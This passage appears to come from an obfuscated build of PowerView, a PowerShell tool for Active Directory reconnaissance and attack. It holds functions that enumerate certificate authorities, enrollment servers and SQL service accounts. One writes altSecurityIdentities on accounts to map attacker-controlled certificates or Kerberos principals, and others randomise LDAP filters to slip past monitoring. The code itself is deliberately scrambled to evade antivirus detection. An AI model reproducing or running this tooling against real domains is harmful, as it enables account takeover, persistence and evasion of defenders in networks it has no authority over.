                    if (${OUtO`B`jecT}."PRiNc`IP`AlType" -eq ("{2}{0}{1}" -f'EC','T','GROUP_OBJ') -or ${oUT`O`BJE`ct}."pRinC`ipaL`T`Ype" -eq ("{1}{2}{3}{0}"-f 'CT','A','LIA','S_OBJE')) {
                       ${Pri`N`Cip`AlM`EMb`Ers}  = @()
                        ${pr`iNcIp`Al} | &("{0}{2}{4}{1}{5}{3}"-f'Get-D','nGr','oma','pMember','i','ou') -Recurse @SearcherArguments | &("{2}{1}{0}"-f'ect','orEach-Obj','F') {
                            ${Me`MbEr} = ${_}
                            ${MEM`BeR}
                            if (${ME`m`BEr}."MEMBEROB`Jec`Tc`LASS" -ne ("{0}{1}" -f 'grou','p')) {
                                ${pRINciPAL`mE`M`BERs} += ${Me`mBeR}
                            }
                        }
                        ${oU`TO`BJEct} | &("{0}{2}{1}" -f 'Ad','mber','d-Me') ("{5}{3}{2}{4}{7}{6}{1}{0}" -f 'ers','emb','i','sivePr','nci','Recur','lM','pa') ${p`Ri`NCIP`A`LMeMbeRs}
                    }
                }
                ${OU`TOb`jEct} | &("{3}{1}{0}{2}" -f 'm','dd-Me','ber','A') ("{2}{1}{3}{0}"-f'D','nci','Pri','palSI') ${prI`NCi`PAlSId}
                ${O`Ut`object}
            }
        }
    }
}

function G`et-dOmai`N`eN`RollME`N`TSER`VErs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{1}{2}" -f'PSS','o','cess','hou','ldPr'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMa`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{0}{1}"-f 'e','r','ntr','DomainCo','oll'})]
        [String]
        ${sE`Rv`ER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edE`NtIAL} =  ( gI ('vaRi'+'a'+'ble:7tQ'+'02')  )."v`ALUe"::"E`MptY"
    )

    ${sEA`R`CH`Era`Rg`UMentS} = @{}
    if (${pSbo`Und`pa`RA`METeRs}[("{0}{1}" -f 'D','omain')]) { ${Sea`RcHErArG`Ume`N`Ts}[("{1}{0}" -f 'omain','D')] = ${dOM`A`in} }
    if (${pSbo`U`NDpara`Me`TERS}[("{0}{1}" -f'Serve','r')]) { ${SeArc`HE`RA`RG`UMenTs}[("{0}{1}"-f'Serve','r')] = ${S`e`RvEr} }
    if (${p`Sbou`NdpA`R`AME`TerS}[("{0}{1}{2}"-f'Cr','e','dential')]) { ${SeAr`ChE`RA`R`GUMeNTs}[("{1}{2}{0}" -f'l','Crede','ntia')] = ${crEDe`Nt`IAl} }

    ${D`O`MaiNDN} = &("{2}{3}{1}{0}"-f'inDN','-Doma','G','et') @SearcherArguments

    if (${do`m`AiNdN}) {
        &("{2}{1}{0}" -f'se','rbo','Write-Ve') ('['+'Get-D'+'oma'+'in'+'Enro'+'llm'+'entServ'+'ers'+'] '+'Got'+' '+'doma'+'i'+'n '+'DN'+': '+"$DomainDN")
    }
    else {
        &("{0}{2}{3}{1}"-f 'Write-Ve','e','r','bos') ('['+'G'+'et-DomainEnrollmentSer'+'vers]'+' '+'Er'+'r'+'or '+'ex'+'tract'+'ing '+'doma'+'in '+'D'+'N '+'f'+'or '+"'$Domain'")
    }

    &("{2}{0}{1}" -f 'et-Doma','inObject','G') -SearchBase "CN=Configuration,$DomainDN" -LDAPFilter (("{6}{8}{10}{7}{2}{1}{0}{5}{9}{4}{3}"-f 'p','ory=','teg','rvice)','ollmentSe','KIEn','(','ctCa','ob','r','je')) @SearcherArguments
}

function geT-dOMa`I`NCAC`Er`TIfIC`ATeS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f'ldPr','PSS','hou','ocess'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`Ma`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}"-f'ain','D','om','Controller'})]
        [String]
        ${s`ERVEr},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RED`e`NTIaL} =   ${7`Tq02}::"eM`pTy"
    )

    ${sEARChEr`AR`gume`NtS} = @{}
    if (${P`sBOUNdp`A`RamEt`eRS}[("{2}{1}{0}" -f 'in','oma','D')]) { ${SeA`R`cheRaRGuM`e`NTS}[("{1}{2}{0}"-f 'in','D','oma')] = ${Do`MA`iN} }
    if (${pSbO`U`NDpaR`A`meTErS}[("{0}{1}"-f 'Serve','r')]) { ${S`eAr`cHe`RArGuMEn`TS}[("{0}{1}" -f 'Ser','ver')] = ${s`eRV`Er} }
    if (${PSbo`U`ND`Par`AMete`RS}[("{0}{1}{2}" -f 'Cred','enti','al')]) { ${S`EA`RCHERA`RguMEntS}[("{1}{2}{0}" -f'ial','C','redent')] = ${C`R`ED`ENtiAl} }

    ${d`oMAiN`dn} = &("{2}{0}{1}{3}"-f 'm','ai','Get-Do','nDN') @SearcherArguments

    if (${DoM`A`InDN}) {
        &("{0}{2}{1}{3}" -f'Write-','bos','Ver','e') ('[G'+'et-D'+'om'+'ainCAC'+'er'+'tific'+'at'+'es'+'] '+'Got'+' '+'dom'+'ain'+' '+'DN'+': '+"$DomainDN")
    }
    else {
        &("{2}{1}{0}" -f'Verbose','ite-','Wr') ('[Ge'+'t-Do'+'m'+'ai'+'nCACer'+'tificates'+'] '+'E'+'rror'+' '+'extra'+'c'+'ti'+'ng '+'dom'+'ai'+'n '+'D'+'N '+'fo'+'r '+"'$Domain'")
    }

    &("{2}{0}{3}{1}"-f'Dom','ject','Get-','ainOb') -SearchBase "CN=Configuration,$DomainDN" -LDAPFilter (("{3}{10}{5}{8}{6}{7}{4}{1}{0}{9}{2}"-f'ut','A','ity)','(objectC','cation','gor','er','tifi','y=c','hor','ate')) @SearcherArguments
}

function gET-`D`omA`in`sq`lI`NstaNCEs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{2}{1}"-f 'PSSh','s','roces','P','ould'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}" -f 'ntrol','o','ler','DomainC'})]
        [String]
        ${se`R`Ver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eD`en`Tial} =   (  ITEM ("{2}{1}{0}"-f'Tq02',':7','variablE') )."V`Alue"::"EmP`TY"
    )

    ${s`eARcHe`R`ARGU`m`enTs} = @{}
    if (${P`s`BOUND`PARamET`erS}[("{0}{1}{2}"-f 'D','omai','n')]) { ${SE`A`RCH`ERargUmE`NtS}[("{0}{1}"-f 'Do','main')] = ${do`Ma`in} }
    if (${psB`OU`NdP`A`Rame`TERS}[("{2}{1}{0}"-f'ver','r','Se')]) { ${S`EA`RCHER`A`RgUmENTS}[("{1}{0}" -f 'er','Serv')] = ${SE`Rver} }
    if (${P`s`BOuND`paRa`mEteRs}[("{2}{0}{1}" -f 'dentia','l','Cre')]) { ${s`eARch`Er`AR`GuMEN`TS}[("{0}{1}{2}" -f 'Cr','edent','ial')] = ${CR`EDE`NTial} }

    &("{2}{3}{0}{1}{4}" -f 'omai','nO','G','et-D','bject') -LDAPFilter ("{7}{3}{2}{6}{1}{5}{4}{0}{8}"-f 'palname','pr','r','e','i','inc','vice','(s','=MSSQLSvc*)') @SearcherArguments | &("{0}{1}" -f'selec','t') -expand ("{4}{1}{2}{0}{3}{5}" -f 'n','i','cepri','cipalnam','serv','e') | &("{1}{0}{2}{3}" -f 're-Obj','Whe','e','ct') {
        ${_} -match ("{0}{1}" -f 'MSS','QLSvc') 
    } | &("{3}{1}{2}{0}" -f'ct','each-','Obje','For') {
        (${_} -split '/')[1] -replace ':',','
    }
}

function A`DD-`DomAinALT`SE`C`URITyIDEnT`ITY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f 'oul','dProces','PSSh','s'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(PosITIoN = 0, VAlUefROmPIpeLIne = ${tr`UE}, vAlUeFrOMpipelINebyPropErTYnaMe = ${tr`UE})]
        [Alias({"{3}{0}{2}{1}" -f'i','nguishedName','sti','D'}, {"{1}{0}{2}"-f'untNam','SamAcco','e'}, {"{1}{0}"-f 'me','Na'})]
        [String[]]
        ${id`eNTiTY},

        [ValidateSet({"{0}{2}{1}" -f'C','e','ertificat'}, {"{2}{1}{0}" -f'os','erber','K'})]
        [String]
        ${TY`Pe} = ("{2}{3}{0}{1}"-f 'cat','e','Certif','i'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${iss`UeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sUbj`EcT},

        [ValidateNotNullOrEmpty()]
        [String]
        ${AC`c`oUnt},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{2}{3}{0}" -f'roller','Do','on','t','mainC'})]
        [String]
        ${S`eR`Ver},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'ADSP','at','h'})]
        [String]
        ${S`E`ARChBasE},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}{2}"-f'Lev','One','el'}, {"{1}{0}{2}" -f 'bt','Su','ree'})]
        [String]
        ${S`eAr`cHsC`oPe} = ("{2}{0}{1}"-f'tr','ee','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`es`U`lTPAgESI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVEr`TImEl`Imit},

        [Switch]
        ${t`o`mbSTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDeN`T`IAl} =  (cHiLDitem  ("V"+"AR"+"IAB"+"le:7TQ0"+"2"))."v`ALue"::"emP`Ty"
    )

    BEGIN {
        ${sE`A`RCH`ERaRguMENts} = @{}
        if (${PSBouN`DParaM`E`TErS}[("{0}{2}{1}"-f 'Do','in','ma')]) { ${SeARcHeRARg`Um`En`Ts}[("{0}{1}"-f 'D','omain')] = ${DOM`AiN} }
        if (${Ps`Boun`d`paRame`T`ERS}[("{0}{1}"-f 'Se','rver')]) { ${S`EARCHeRAr`GUMen`Ts}[("{1}{0}"-f'r','Serve')] = ${SE`R`VEr} }
        if (${PsbOuN`D`pA`RAMEtERs}[("{1}{2}{0}{3}"-f 'n','Cr','ede','tial')]) { ${sEA`RCHe`Ra`R`GUMENtS}[("{1}{2}{0}"-f 'tial','Crede','n')] = ${CR`e`d`EnTial} }
        if (${ps`B`OUNdparAMet`ers}[("{0}{2}{1}"-f'Se','ase','archB')]) { ${SEARcH`ErAR`gu`mEn`Ts}[("{0}{1}{2}" -f 'Searc','hB','ase')] = ${SE`ARc`hBAse} }
        if (${psB`Ou`NdPArA`MeTers}[("{3}{2}{1}{0}" -f 'pe','chSco','ar','Se')]) { ${SEar`chERa`RgU`mEn`TS}[("{0}{1}{2}{3}" -f 'Sea','rc','h','Scope')] = ${Sea`Rc`HS`cOPe} }
        if (${p`sBOuNDpA`RaM`eTe`Rs}[("{0}{2}{3}{1}" -f'Resu','e','lt','PageSiz')]) { ${s`Ear`Ch`E`RARguMENtS}[("{2}{0}{1}{3}"-f 'P','ageSi','Result','ze')] = ${R`eSUlTpag`es`ize} }
        if (${P`sboU`N`DPaRa`m`ETeRs}[("{0}{2}{4}{1}{3}"-f 'S','mi','erverTime','t','Li')]) { ${se`A`RCH`erAR`g`UmENTs}[("{0}{1}{2}{3}"-f 'Se','r','verTim','eLimit')] = ${se`RvE`RtimE`Li`MIT} }
        if (${pSboundPa`RAMeT`E`Rs}[("{2}{0}{1}" -f'sto','ne','Tomb')]) { ${SE`AR`ChEr`ArGu`mENTS}[("{3}{0}{2}{1}" -f 'b','e','ston','Tom')] = ${t`OMbst`oNE} }
        if (${PS`BouN`dp`ArameT`ERs}[("{2}{3}{0}{1}" -f'e','ntial','Cr','ed')]) { ${se`Ar`cHER`ArGUm`En`TS}[("{0}{1}{2}" -f 'Cre','den','tial')] = ${cR`E`DENTiAl} }
        ${sE`ArcH`ER} = &("{4}{0}{3}{1}{2}"-f '-Domai','c','her','nSear','Get') @SearcherArguments
        ${dom`A`I`N`dNaRGUMeNTS} = @{}
        if (${P`s`BoundPar`AmEtErs}[("{1}{0}"-f'n','Domai')]) { ${doma`inDn`ArgU`M`eNTs}[("{1}{2}{0}" -f'n','Doma','i')] = ${d`OM`AiN} }
        if (${Ps`BoUND`ParA`m`E`TERS}[("{1}{0}" -f'ver','Ser')]) { ${D`oMaiNdn`ARgU`M`eN`Ts}[("{1}{0}" -f'rver','Se')] = ${s`eR`Ver} }
        if (${psB`oUnD`PA`RAmETE`RS}[("{2}{0}{1}" -f'r','edential','C')]) { ${Do`maiNdN`A`RGumEn`TS}[("{1}{0}{2}"-f'enti','Cred','al')] = ${Cre`deNTi`AL} }
    }


    PROCESS {
        ${fI`LtEr} = ''
        if (${i`dent`ITy}) {
            &("{2}{1}{4}{3}{0}"-f 'erbose','ri','W','e-V','t') ('[A'+'dd-Dom'+'ainAltS'+'ecur'+'ity'+'I'+'dent'+'i'+'ty] '+'Se'+'t'+'ting '+'pr'+'ovided'+' '+'i'+'den'+'titie'+'s: '+"$Identity")
            ${iDen`TI`Ty} | &("{3}{0}{4}{2}{1}" -f 'et-Ide','tring','yFilterS','G','ntit') | &("{2}{3}{1}{0}"-f'ct','je','ForEach-O','b') {
                ${fi`LTEr} += ${_}
            }
        }

        ${Al`TI`Ds`TRINg} = ''
        if (${P`S`BoUndpaR`AMeTERS}[("{0}{1}"-f 'Ty','pe')] -eq ("{2}{1}{0}{3}"-f'ca','rtifi','Ce','te')) {
            ${DoM`Ai`NDN} = &("{3}{1}{0}{2}" -f 'o','et-D','mainDN','G') @DomainDNArguments
            ${dOm`AIND`N`SP`lIt} = ${dOM`A`iNdN} -split ','
              (  CHildITEm ("{0}{1}{2}{4}{3}"-f'VA','r','Iable:vH','s','A') )."va`lue"::("{0}{2}{1}" -f 'R','rse','eve').Invoke(${DO`mAiN`Dns`pLIt})
            ${REVER`s`eD`domAI`NDN} = ${doM`AInDN`S`PLIt} -join ','

            ${ALtId`STR`iNG} = ("{0}{1}" -f'X5','09:')
            if (${PsB`Oun`dP`A`RamEtE`RS}[("{0}{1}"-f'I','ssuer')]) {
                ${aLTiDST`R`i`NG} += "<I>$ReversedDomainDN,$Issuer"
            }
            if (${P`sbOuN`DpaRA`meTERS}[("{1}{0}{2}" -f 'u','S','bject')]) {
                ${aL`TI`D`STRInG} += "<S>$ReversedDomainDN,$Subject"
            }
            else {
                &("{3}{1}{0}{2}" -f 'te','i','-Error','Wr') ("{10}{11}{5}{1}{2}{14}{16}{17}{13}{3}{9}{7}{6}{4}{0}{8}{15}{12}"-f 'i','it','yIden','icate al','nt','cur','de','rityI','ty requires a S','tSecu','[Add-DomainAl','tSe','bject','ertif','ti','u','ty] ','C')
                return
            }
        }
        elseif (${psBoUNDp`ARaM`et`erS}[("{0}{1}"-f'Accoun','t')]) {
            ${aLtId`sT`RinG} = "Kerberos:$Account"
        }
        else {
            &("{1}{3}{0}{2}" -f'-Erro','Writ','r','e') ("{0}{4}{8}{5}{9}{1}{3}{11}{6}{12}{7}{13}{10}{2}"-f'[Add-','tyIdentit','set','y] A -','D','mainAlt','ype mu','b','o','Securi',' ','T','st ','e')
            return
        }

        &("{0}{3}{2}{4}{1}" -f'Wr','ose','-','ite','Verb') ('[A'+'dd-DomainAltSec'+'ur'+'ityI'+'d'+'e'+'ntit'+'y] '+'Us'+'ing'+' '+'Alter'+'na'+'te '+'Id'+'e'+'ntity '+'stri'+'ng'+': '+"$AltIDString")


        if (${f`iL`TER}) {
            ${S`e`ArCHeR}."fI`LTer" = "(|$Filter)"
            ${Resu`LTs} = ${SEa`Rc`hER}.("{1}{0}"-f'l','FindAl').Invoke()
            ${r`e`SuLtS} | &("{2}{0}{1}" -f'ere-Obj','ect','Wh') {${_}} | &("{0}{3}{2}{4}{1}"-f 'For','t','je','Each-Ob','c') {
                ${Pro`Ps} = ${_}."P`R`oper`TIes"
                if (${Pr`OPS}."kE`yS" -contains ("{1}{3}{4}{2}{0}{5}"-f 'i','a','ur','l','tsec','tyidentities')) {
                    ${aLt`I`DS} = ${pR`Ops}[("{2}{1}{4}{3}{0}{5}"-f 'entit','ecurity','alts','d','i','ies')]
                }
                else {
                    ${A`l`TiDs} = @()
                }

                ${a`LtIdS} += ${alt`iDStR`INg}

                &("{2}{1}{0}{3}" -f 'main','-Do','Set','Object') ${p`RO`Ps}[("{1}{2}{4}{0}{3}" -f'm','sa','ma','e','ccountna')] -Set @{("{6}{0}{3}{4}{1}{2}{5}" -f'l','ity','ide','ts','ecur','ntities','a')=${A`LT`idS}}
            }
        }
    }
}

function i`NvOKe-ldap`QUE`Ry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{8}{2}{4}{5}{7}{3}{9}{6}{1}"-f'P','ments','eDeclared','hanAss','VarsMo','re','gn','T','SUs','i'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f'Pro','ce','ss','PSShould'}, '')]
    [OutputType({"{2}{3}{1}{0}" -f'iew.User','rV','Po','we'})]
    [OutputType({"{3}{5}{4}{2}{0}{1}" -f'ew.User.','Raw','i','Powe','V','r'})]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${LdA`Pfi`lTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`O`PerTI`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'h','DSPat','A'})]
        [String]
        ${s`eA`RCHbA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f 'ntroller','inCo','D','oma'})]
        [String]
        ${S`eRv`er},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{2}{1}" -f 'One','evel','L'}, {"{0}{1}"-f'Su','btree'})]
        [String]
        ${sEA`R`CHsC`oPE} = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsUL`T`PaGEsIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERVER`TIM`e`L`i`mIT},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{1}{0}"-f 'p','Grou'}, {"{1}{0}"-f'e','Non'}, {"{0}{1}" -f'Ow','ner'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${s`Ecu`Ri`TYmas`ks},

        [Switch]
        ${To`mbsT`onE},

        [Alias({"{2}{0}{1}"-f'nOn','e','Retur'})]
        [Switch]
        ${f`in`dOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DE`N`TIaL} =   (  iTEM ('vARiAble'+':7'+'tQ02')  )."vAL`Ue"::"E`mPTY",

        [Switch]
        ${R`AW},

        [Switch]
        ${s`sl},

        [Switch]
        ${O`BFUs`cAtE}
    )

    BEGIN {
        ${searC`he`Rarg`UmEnTS} = @{}
        if (${psbO`UNdPa`RaMeTe`Rs}[("{1}{0}"-f'omain','D')]) { ${s`E`A`RCherArgUmen`TS}[("{1}{0}" -f 'in','Doma')] = ${DOmA`iN} }
        if (${PSbO`Un`dP`ARamET`ERS}[("{2}{1}{0}"-f's','pertie','Pro')]) { ${SEar`cHERA`RGUME`NTs}[("{1}{2}{0}"-f's','P','ropertie')] = ${prOp`ER`TiEs} }
        if (${pSBo`UN`DpaR`AMETErs}[("{1}{0}" -f'r','Owne')]) { ${seAr`cH`er`ARgu`MEN`TS}[("{2}{1}{0}" -f 's','tie','Proper')] = '*' }
        if (${p`sBOUn`DpaRAM`eTERs}[("{1}{3}{2}{0}" -f'e','Sear','hBas','c')]) { ${SearCh`E`R`ArguME`N`Ts}[("{1}{2}{0}"-f'se','Searc','hBa')] = ${sEa`R`CH`BASE} }
        if (${Psbo`U`NdPA`Ra`mE`TerS}[("{0}{1}"-f 'Serv','er')]) { ${S`EAR`ChE`RArgUMEnTS}[("{0}{1}"-f 'Serve','r')] = ${s`ErVER} }
        if (${ps`B`OuNDPARa`mE`TerS}[("{2}{1}{0}{3}" -f 'rchSc','ea','S','ope')]) { ${se`Ar`cHERaRG`UMe`NTS}[("{2}{0}{1}" -f'arc','hScope','Se')] = ${SEA`R`cH`scope} }
        if (${PS`B`Ou`NdPA`RaM`eTerS}[("{2}{3}{1}{0}"-f 'e','ltPageSiz','Res','u')]) { ${sEAr`cHeRARG`Um`en`Ts}[("{2}{3}{0}{1}" -f'eSi','ze','ResultP','ag')] = ${ReS`ULtpAGE`si`ze} }
        if (${Psb`o`UNDparam`e`TerS}[("{0}{4}{3}{1}{2}"-f'Server','i','t','imeLim','T')]) { ${s`Earc`HERArGU`MentS}[("{0}{1}{3}{2}"-f'Se','rver','eLimit','Tim')] = ${S`erv`Er`TImELiMIT} }
        if (${pSBo`U`N`DP`ARAmETE`RS}[("{1}{3}{0}{2}{4}"-f'rityM','S','as','ecu','ks')]) { ${s`ear`chE`RArgu`Me`NTs}[("{0}{3}{2}{1}"-f 'Se','ityMasks','ur','c')] = ${sEc`UR`ity`MAsKs} }
        if (${PSBOu`Ndp`AR`AMET`Ers}[("{0}{1}" -f 'O','wner')]) { ${sEaRcH`e`RARGU`Me`Nts}[("{2}{0}{3}{1}"-f 'curit','ks','Se','yMas')] = ("{0}{1}"-f'Owne','r') }
        if (${ps`BouNDpArAM`e`T`ERs}[("{1}{0}" -f'bstone','Tom')]) { ${SEA`RC`HE`R`A`RGumEnts}[("{1}{0}{2}"-f 'ston','Tomb','e')] = ${ToMb`StO`NE} }
        if (${P`SBOUNDPa`Ra`m`eTerS}[("{0}{2}{1}"-f 'Cred','l','entia')]) { ${s`e`ARcH`ERARG`UmEN`Ts}[("{1}{3}{2}{0}" -f'ntial','C','ede','r')] = ${C`RED`E`NtIAl} }
    }

    PROCESS {
        if (${P`s`BoUn`Dparam`ETERS}[("{0}{2}{1}{3}"-f'Obf','scat','u','e')]) {
            ${ld`APFI`lT`ER} = &("{0}{3}{1}{4}{2}{5}" -f 'G','ate','ilterStrin','et-Obfusc','dF','g') -LDAPFilter ${LDa`PF`IL`Ter}
        }
        if (${pSB`Ou`NdP`AR`AmETE`Rs}['SSL']) {
            ${MaXREsu`l`TStorEqU`E`ST} = 1000
            ${rES`UL`Ts} = @()
            ${se`ARC`hER} = &("{3}{2}{0}{1}" -f 'omainS','earcher','et-D','G') @SearcherArguments -SSL

            ${r`eq`UesT} = &("{0}{1}{2}" -f 'N','ew-Obje','ct') -TypeName ("{3}{7}{2}{1}{4}{0}{5}{6}" -f 'rvices.Proto','r','tem.Directo','S','ySe','cols.SearchRe','quest','ys')
            ${p`AG`E`R`eQuESTc`ontROL} = &("{0}{1}{2}"-f 'New-O','bje','ct') -TypeName ("{2}{11}{8}{12}{14}{4}{10}{9}{1}{0}{3}{7}{15}{6}{17}{5}{13}{16}"-f 'ols.P','c','S','a','toryS','C','sul','geR','.','es.Proto','ervic','ystem','Di','ont','rec','e','rol','tRequest') -ArgumentList ${MAxReS`ULT`S`TOrEqUE`ST}

            
            if (${p`S`BoU`NDPARAME`T`ErS}[("{0}{3}{2}{1}"-f 'Se','s','k','curityMas')]) {
                ${SDFLaG`sC`onT`R`ol} = &("{0}{2}{1}" -f 'New-Ob','ct','je') -TypeName ("{4}{1}{2}{0}{10}{14}{11}{6}{8}{13}{9}{3}{15}{12}{5}{7}" -f 'oryServi','stem.Dir','ect','orFlag','Sy','ntro','s','l','cr','t','ces','otocols.SecurityDe','o','ip','.Pr','C') -ArgumentList ${SEcURIty`Ma`sKs}
                ${rEQ`Uest}."con`TR`OLs".("{0}{1}" -f'A','dd').Invoke(${Sdf`L`AGS`cont`ROl})
            }

            if (${p`Sboun`D`paRAmet`eRs}[("{3}{2}{0}{1}" -f'Bas','e','h','Searc')]) {
                ${ReQ`UE`sT}."D`iSt`InGU`I`s`heDNaME" = ${sear`ChBA`se}
            }
            else {
                ${t`Arg`et`DO`maIn} = ${s`eaRc`HEr}."SEsSi`oN`o`pTionS"."DO`maINna`me"
                ${do`mai`NdN} = (("DC=$($TargetDomain.Replace('.',',DC='))"))
                ${r`EqUE`ST}."dis`TI`NguI`sHE`dNAME" = ${do`mAin`DN}
            }
            if (${Ps`BOu`NDPara`M`e`TeRs}[("{3}{0}{2}{1}"-f 'Sc','pe','o','Search')]) {
                ${ReQ`UesT}."sc`ope" = ${s`EArCHs`copE}
            }
            ${reQu`e`St}."c`o`NtrOLS".("{1}{0}"-f 'dd','A').Invoke(${Pager`E`QuEstCO`NtroL})
            if (${LD`Ap`FiLtEr} -and ${l`DAP`F`ilTeR} -ne '') {
                ${R`Eq`UesT}."f`IlteR" = "$LdapFilter"
            }

            while(${T`RuE}) {
                ${rE`sPo`NSE} = ${s`E`ARCh`ER}.("{2}{1}{0}"-f'st','eque','SendR').Invoke(${REQ`U`est})
                if (${R`ES`ponSE}."RESU`LTc`ODe" -eq ("{1}{0}" -f'ss','Succe')) {
                    foreach (${e`N`TrY} in ${R`esP`onSe}."ENtr`IeS") {
                        ${ResUL`TS} += ${e`NTrY}
                        if (${P`SbOUnDpar`AMEt`ERS}[("{1}{2}{0}" -f'ne','F','indO')]) {
                            break
                        }
                    }
                }
                if (${P`SBOunDpar`AmetE`RS}[("{0}{1}" -f'Fin','dOne')]) {
                    break
                }

                ${PaGE`ReS`pO`N`SEConTrOl} = [System.DirectoryServices.Protocols.PageResultResponseControl]${R`esponse}."Co`Ntr`OLS"[0]
                if (${pAg`eRESp`OnS`eCon`TRol}."co`oK`ie"."le`NGTH" -eq 0) {
                    break
                }
                ${PagEReQUE`S`TcO`Ntrol}."co`OkiE" = ${paGeREspon`seCo`N`Tr`OL}."c`OOK`IE"
            }
        }
        else {
            ${Se`ARcH`ER} = &("{0}{3}{1}{2}" -f 'G','-Do','mainSearcher','et') @SearcherArguments
            ${sEa`Rch`ER}."Fi`LtER" = "$LDAPFilter"
            &("{1}{0}{2}" -f 'ite-V','Wr','erbose') "[Invoke-LDAPQuery] filter string: $($Searcher.filter) "

            if (${psBou`NdP`A`RA`MetERs}[("{0}{1}{2}" -f 'Fin','dO','ne')]) { ${R`ESULtS} = ${se`AR`CHER}.("{0}{2}{1}" -f'F','dOne','in').Invoke() }
            else { ${rES`U`Lts} = ${sEARcH`Er}.("{1}{0}"-f'dAll','Fin').Invoke() }
        }
        ${R`Esu`lts}
    }
}

function gEt-obF`UsC`AteDF`ILt`Ers`Tr`iNg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'ouldP','PSSh','ss','roce'}, '')]
    [OutputType({"{1}{0}" -f 'ng','Stri'})]
    [CmdletBinding()]
    Param(
        [Parameter(MAndATorY = ${tr`UE}, valueFROmPIpElinE = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        ${ldA`pFI`lTEr}
    )

    &("{1}{0}{2}" -f'o','Write-Verb','se') "[Get-ObfuscatedFilterString] Obfuscating filter string: $($LDAPFilter) "
    ${p`ArTS} = ${LdApf`ilT`ER} -split '='
    ${OutF`ilT`ER} = "$($Parts[0])="
    ${s`kiP} = ${f`AlsE}
    if (${p`Ar`Ts}[0] -match ("{4}{1}{5}{3}{0}{2}"-f'ro','r','l','ountCont','use','Acc')) {
        ${s`Kip} = ${t`RUe}
    }
    for (${I}=1; ${i} -lt ${PAR`Ts}."LeN`gTH"; ${I}++) {
        if (${S`kIp}) {
            if (${pa`RTS}[${i}] -notmatch ("{4}{1}{0}{2}{3}"-f'unt','Acco','Con','trol','user')) {
                ${Sk`ip} = ${F`A`LSE}
            }
            if (${i} -eq ${PaR`Ts}."Le`N`gTh" - 1) {
                ${oUtf`IL`Ter} += "$($Parts[$i])"
            }
            else {
                ${Ou`T`Fi`LTER} += "$($Parts[$i])="
            }

        }
        else {
            if (${p`Ar`Ts}[${i}].("{0}{1}"-f 'I','ndexOf').Invoke(')') -ne -1) {
                ${VA`LuE} = ${p`AR`Ts}[${I}]."sU`BSTrIng"(0,${pA`RtS}[${I}].("{0}{1}" -f 'Inde','xOf').Invoke(')'))
            }
            else {
                ${V`A`lUe} = ${P`ArTS}[${I}]
            }
            if (${v`A`Lue}."LeNG`TH" -gt 1) {
                ${OuTV`A`LUe`HAsh} = @{}
                for (${C}=0; ${c} -lt (&("{0}{3}{1}{2}"-f 'G','t-Ran','dom','e') -Maximum $(${v`Alue}."Le`N`gtH") -Minimum 1); ${c}++) {
                    ${InD`EX} = &("{1}{2}{0}{3}"-f 'Rand','G','et-','om') -Maximum $(${v`AlUe}."LeNG`TH" - 1)
                    if ((${o`U`TV`ALue`HAsH}."KE`ys" | &("{2}{0}{1}{3}"-f'easure','-','M','Object'))."COu`Nt" -ne 0) {
                        if (${o`U`TVA`lueH`Ash}."K`EyS" -contains ${InD`eX}) {
                            Do
                            {
                                ${I`ND`eX} = &("{1}{0}{2}" -f't-Rand','Ge','om') -Maximum $(${vaL`UE}."lEN`gTh" - 1)
                            } While (${Outva`LueH`Ash}."K`EYs" -contains ${I`N`dEX})
                        }
                    }
